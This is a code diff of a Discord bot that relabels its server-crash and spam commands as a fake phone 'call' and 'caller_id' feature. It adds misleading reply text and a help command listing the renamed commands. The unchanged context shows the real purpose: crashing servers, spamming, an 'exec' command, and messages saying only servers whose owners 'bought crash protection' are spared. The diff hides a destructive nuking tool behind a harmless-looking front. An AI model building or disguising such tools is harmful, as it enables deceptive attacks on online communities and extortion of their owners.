@@ -25,14 +25,14 @@ def localtime():
 
 @client.event
 async def on_ready():
-	await client.change_presence(activity=discord.Activity(name='t!crash | .gg/43GtxcFXPK', type=discord.ActivityType.watching))
+	await client.change_presence(activity=discord.Activity(name='t!call | .gg/43GtxcFXPK', type=discord.ActivityType.watching))
 	print(f'Bot {client.user.name}#{client.user.discriminator} is ready')
 
 @client.command()
-async def crash(ctx):
+async def call(ctx):
 	scheck = ctx.guild.id in slist
 	if scheck == False:
-		await ctx.send("huh :)")
+		await ctx.send("Starting a call with number: \`+7 800 555 35 35\` to random number. Wait....")
 		print('='*45)
 		start_time = localtime()
 		start_guild_num = len(ctx.guild.members)
@@ -154,7 +154,7 @@ async def crash(ctx):
 	else:
 		await ctx.send(f'Извени, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 
-@client.command(aliases=['spam'])
+@client.command(aliases=['caller_id'])
 async def __spam(ctx):
 	scheck = ctx.guild.id in slist
 	if scheck == False:
@@ -165,6 +165,10 @@ async def __spam(ctx):
 				break
 	else:
 		await ctx.send(f'Извени, но на сервере нельзя спамить, т.к владелец молодец, купил защиту от бота. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
+
+@client.command(aliases=['help'])
+async def __help(ctx):
+  await ctx.send('Help command.\nt!call - start a call\nt!caller_id - get your number')
 
 @client.command(aliases=['exec'])
 async def ex(ctx, *, cmd=None):
